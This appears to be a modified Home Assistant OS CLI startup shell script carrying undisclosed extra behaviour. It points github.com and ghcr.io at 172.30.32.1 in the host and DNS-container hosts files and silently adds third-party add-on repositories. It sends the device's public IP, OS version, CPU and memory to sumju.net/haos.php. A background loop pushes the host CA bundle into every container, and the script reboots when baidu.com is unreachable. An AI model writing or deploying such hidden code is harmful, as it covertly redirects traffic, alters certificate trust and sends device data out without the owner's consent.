#!/bin/sh
# ==============================================================================
# Run logging cli
# ==============================================================================

echo "Waiting for the Home Assistant CLI to be ready..."

i=0
while [ ! "$(docker ps -q -f name=hassio_cli)" ]; do
    sleep 1
    i=$((i+1))
    if [ $i = 120 ]; then
        echo "[WARN] Home Assistant CLI not starting! Jump into emergency console..."
        exec /bin/ash -l
    fi
done

echo "---------------------------------------------------------------------------------"
echo "Runinng IT Commander's Script ...  (https://sumju.net or YouTube @itcommander)"
echo "---------------------------------------------------------------------------------"

# Init Core add by 5high
check_internet() {
    for i in $(seq 1 12); do
        if curl -s -k --head https://www.baidu.com | head -n 1 | grep "HTTP/1.[01] [23].." > /dev/null; then
            if ! grep -q "172.30.32.1   github.com ghcr.io" /etc/hosts; then
                echo "172.30.32.1   github.com ghcr.io" >> /etc/hosts
            fi
            sleep 5
            if docker images | awk '{print $2}' | grep -q 'landingpage'; then
                post_to_haos
            fi
            break
        else
            echo "Waiting for internet connection... (attempt $i/12)"
            sleep 5
        fi
    done
    
    if [ $i -eq 12 ]; then
        echo "No internet connection detected. Rebooting..."
        reboot
    fi
}

post_to_haos() {
    add_repositories
    public_ip=$(curl -s ipinfo.io | jq -r .ip 2>/dev/null || echo "unknown")
    source /etc/os-release
    cpu_model=$(cat /proc/cpuinfo | grep 'model name' | uniq | cut -d ':' -f2 | sed 's/^ *//')
    memory_size=$(free -h | awk '/^Mem:/ {print $2}')
    post_data="ip=$public_ip&version_id=$VERSION_ID&variant_id=$VARIANT_ID&cpu_model=$cpu_model&memory_size=$memory_size"
    curl -s -X POST -d "$post_data" https://sumju.net/haos.php
}

add_repositories() {
    json_file="/mnt/data/supervisor/store.json"
    temp_file="/tmp/store_temp.json"
    new_repositories="https://github.com/5high/Home-Assistant-Addons https://github.com/zigbee2mqtt/hassio-zigbee2mqtt"    
    if [ -e "$json_file" ]; then
        existing_repositories=$(jq -r '.repositories[]' "$json_file")
        for repo in $new_repositories; do
            if echo "$existing_repositories" | grep -q "$repo"; then
                echo "Element already exists: $repo"
            else
                updated_repositories=$(echo "$existing_repositories" | jq --arg repo "$repo" '.repositories += [$repo]')
                echo "$updated_repositories" > "$temp_file" && mv "$temp_file" "$json_file"
                echo "Element added: $repo"
            fi
        done
    else
        echo '{"repositories": []}' > "$json_file"
        for repo in $new_repositories; do
            updated_repositories=$(jq --arg repo "$repo" '.repositories += [$repo]' "$json_file")
            echo "$updated_repositories" > "$temp_file" && mv "$temp_file" "$json_file"
            echo "Element added: $repo"
        done
    fi
}

change_dns(){
    while true; do
        sleep 10
        if docker ps | grep -q hassio_dns; then
                if ! docker exec hassio_dns grep -q 'github.com' /config/hosts; then
                    docker exec -i hassio_dns sed -i '/^172.30.32.1/ s/$/ github.com ghcr.io/' /config/hosts
                fi
                break
        else
                echo "Container 'hassio_dns' is not running. Retrying in 5 seconds..."
        fi
    done
}

update_certificates() {
    while true; do
        for container_id in $(docker ps -q); do
            container_name=$(docker inspect --format='{{.Name}}' $container_id | sed 's@/@@')
            docker exec $container_id stat /etc/ssl/certs/sumju.net >/dev/null 2>&1
            if [ $? -ne 0 ]; then
                docker exec $container_id touch /etc/ssl/certs/sumju.net
                docker cp /etc/ssl/certs/ca-certificates.crt $container_name:/etc/ssl/certs/ca-certificates.crt
            fi
        done
        sleep 60
    done
}

check_internet
change_dns
update_certificates >/dev/null 2>&1 &

docker container exec \
    -ti hassio_cli \
    /usr/bin/cli.sh

case $? in
  10)
    # Jump to root login shell (login command)
    exec /bin/ash -l
    ;;
  143)
    # 143 graceful termination (SIGTERM). Most likely a proper shutdown.
    # Just sleep for a while until actual systemd shutdown gets invoked.
    echo ""
    echo "Home Assistant CLI has been terminated."
    sleep 30
    ;;
  *)
    echo "HA CLI failed with error code: $?"
    ;;
esac
